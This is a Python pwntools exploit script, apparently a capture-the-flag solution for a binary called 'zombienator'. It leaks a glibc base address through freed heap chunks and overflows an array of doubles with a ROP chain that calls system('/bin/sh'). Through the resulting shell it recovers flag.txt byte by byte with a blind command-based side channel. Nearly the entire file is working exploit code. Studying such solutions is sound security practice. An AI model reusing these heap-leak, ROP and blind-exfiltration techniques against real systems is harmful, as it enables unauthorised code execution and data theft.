#!/usr/bin/env python3

from pwn import *
from struct import unpack
from typing import List, Union

context.binary = elf = ELF('zombienator')
glibc = ELF('glibc/libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def create(tier: int, position: int):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b"Zombienator's tier: ", str(tier).encode())
    p.sendlineafter(b'Front line (0-4) or Back line (5-9): ', str(position).encode())


def remove(position: int):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b"Zombienator's position: ", str(position).encode())


def display():
    p.sendlineafter(b'>> ', b'3')
    slots = []

    for _ in range(10):
        p.recvuntil(b'Slot [')
        p.recv(4)
        slots.append(p.recvline().strip())

    return slots


def attack(coordinates: List[Union[int, str]]):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'Number of attacks: ', str(len(coordinates)).encode())

    for coordinate in coordinates:
        p.sendlineafter(b'Enter coordinates: ', str(coordinate).encode())


def main():
    for i in range(10):
        create(0x82, i)

    for i in range(10):
        remove(i)

    glibc.address = u64(display()[7].ljust(8, b'\0')) - 0x219ce0

    if not hex(glibc.address).startswith('0x7') or not hex(glibc.address).endswith('000'):
        return

    p.success(f'Glibc base address: {hex(glibc.address)}')

    rop = ROP(glibc)

    payload  = [0] * 33
    payload += [
        '.',
        0,
        unpack('d', p64(rop.ret.address))[0],
        unpack('d', p64(rop.rdi.address))[0],
        unpack('d', p64(next(glibc.search(b'/bin/sh'))))[0],
        unpack('d', p64(glibc.sym.system))[0],
    ]

    attack(payload)

    try:
        for c in range(0x20, 0x7f):
            p.sendline(f"cut -c {len(flag) + 1}-{len(flag) + 1} flag.txt | xxd -p | grep {c:02x}0a && exit".encode())
            sleep(.1)
            p.sendline(b'echo')
    except EOFError:
        flag.append(c - 1)


if __name__ == '__main__':
    flag = []
    flag_prog = log.progress('Flag')

    while ord('}') not in flag:
        flag_prog.status(bytes(flag).decode())

        with context.local(log_level='CRITICAL'):
            p = get_process()
            main()
            p.close()

    flag_prog.success(bytes(flag).decode())
